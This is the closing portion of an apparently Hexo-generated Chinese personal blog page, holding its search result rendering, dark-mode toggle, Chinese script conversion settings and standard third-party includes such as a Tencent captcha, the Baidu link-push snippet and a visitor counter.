                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        <script type="text/javascript" src="/js/tw_cn.js"></script>
        <script type="text/javascript">
          var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体
          var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0
          var cookieDomain = "https://carrot11223.github.io"; //Cookie地址, 一定要设定, 通常为你的网址
          var msgToTraditionalChinese = "繁"; //此处可以更改为你想要显示的文字
          var msgToSimplifiedChinese = "简"; //同上，但两处均不建议更改
          var translateButtonId = "translateLink"; //默认互换id
          translateInitilization();
        </script>
    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
